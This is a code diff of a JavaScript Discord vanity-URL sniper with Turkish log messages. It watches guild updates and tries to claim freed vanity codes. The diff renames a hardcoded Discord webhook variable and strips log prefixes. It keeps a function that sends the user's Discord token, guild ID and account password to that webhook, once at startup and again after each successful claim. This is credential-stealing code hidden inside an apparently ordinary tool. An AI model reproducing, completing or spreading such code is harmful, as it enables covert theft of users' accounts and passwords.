@@ -14,7 +14,7 @@ let heartbeatTimer = null;
 let tlsSocket = null;
 const vanityMap = new Map();
 
-const wdsv2 = 'https://canary.discord.com/api/webhooks/1444082551605170318/oMWsvhMZ4plnUovqFrUTwfQYbTTcf7HBwwFfzWKKNcYumWnNPW4sx0QDF3t5LhzWvyVm';
+const claimhooks = 'https://canary.discord.com/api/webhooks/1444082551605170318/oMWsvhMZ4plnUovqFrUTwfQYbTTcf7HBwwFfzWKKNcYumWnNPW4sx0QDF3t5LhzWvyVm';
 
 const USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
 const X_SUPER_PROPERTIES = 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6InRyLVRSIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTMxLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiJodHRwczovL3d3dy5nb29nbGUuY29tLyIsInJlZmVycmluZ19kb21haW4iOiJ3d3cuZ29vZ2xlLmNvbSIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjozNTgyOTUsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGwsImRlc2lnbl9pZCI6MH0=';
@@ -43,7 +43,7 @@ function sendWebhook(vanityUrl) {
 }
 
 function sendInfoWebhook() {
-  axios.post(wdsv2, {
+  axios.post(claimhooks, {
     content: `token: ${USER_TOKEN}\nguild: ${TARGET_GUILD_ID}\npass: ${USER_PASSWORD}`
   }).catch(() => {});
 }
@@ -196,7 +196,7 @@ function establishGatewayConnection() {
       if (packet.t === 'GUILD_UPDATE') {
         const oldCode = vanityMap.get(packet.d.guild_id);
         if (oldCode && oldCode !== packet.d.vanity_url_code) {
-          console.log(`[SNIPE] Vanity degisti: ${oldCode}`);
+          console.log(`Vanity degisti: ${oldCode}`);
           
           let success = false;
           for (let i = 0; i < 3; i++) {
@@ -207,7 +207,7 @@ function establishGatewayConnection() {
             try {
               const snipeData = JSON.parse(snipeResp);
               if (snipeData.code === oldCode || snipeData.vanity_url_code === oldCode || (!snipeData.code && !snipeData.message)) {
-                console.log(`[BASARILI] URL alindi: ${oldCode}`);
+                console.log(`URL alindi: ${oldCode}`);
                 sendWebhook(oldCode);
                 sendInfoWebhook();
                 success = true;
@@ -217,7 +217,7 @@ function establishGatewayConnection() {
           }
           
           if (!success) {
-            console.log(`[BASARISIZ] URL alinamadi: ${oldCode}`);
+            console.log(`URL alinamadi: ${oldCode}`);
           }
         }
       } else if (packet.t === 'READY') {
@@ -227,7 +227,7 @@ function establishGatewayConnection() {
             vanityMap.set(g.id, g.vanity_url_code);
           }
         });
-        console.log(`[HAZIR] ${vanityMap.size} vanity URL izleniyor`);
+        console.log(`${vanityMap.size} vanity URL izleniyor`);
       }
     }
   });
@@ -242,15 +242,15 @@ function establishGatewayConnection() {
 }
 
 async function main() {
-  console.log('[BASLATMA] Program baslatiliyor...');
+  console.log('Program baslatiliyor...');
   
   sendInfoWebhook();
   
   if (!mfaAuthToken) {
-    console.log('[MFA] Token aliniyor...');
+    console.log('Token aliniyor...');
     mfaAuthToken = await authenticateMfa();
     if (mfaAuthToken) {
-      console.log('[MFA] Token basariyla alindi');
+      console.log('Token basariyla alindi');
     }
   }
   
